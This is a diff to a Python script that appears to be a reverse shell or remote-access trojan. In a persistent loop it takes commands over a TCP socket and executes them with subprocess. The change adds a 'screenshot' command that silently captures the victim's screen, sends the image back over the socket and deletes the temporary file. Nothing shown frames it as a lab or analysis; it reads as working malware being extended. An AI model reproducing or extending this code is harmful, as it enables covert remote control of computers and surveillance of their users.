@@ -1,6 +1,6 @@
 while True:
     try:
-        import socket as s,subprocess as sp,os
+        import socket as s, subprocess as sp, os, pyautogui, tempfile
         #creatin socket
         BUFFER_SIZE = 1024 * 1280
         s1=s.socket(s.AF_INET,s.SOCK_STREAM)
@@ -30,6 +30,12 @@ while True:
                         output = "File Not Found"  
                     except:
                         pass      
+                elif d.lower() == "screenshot":
+                    pyautogui.screenshot().save(f"{tempfile.gettempdir()}\MyScreenshot.png")
+                    with open(f"{tempfile.gettempdir()}\MyScreenshot.png", "rb") as image:
+                        c.send(image.read())
+                    os.remove(f"{tempfile.gettempdir()}\\MyScreenshot.png")    
+                    output = "screenshot saved!"  
                 else:
                     output = str(sp.getoutput(d))
                 cwd = os.getcwd()
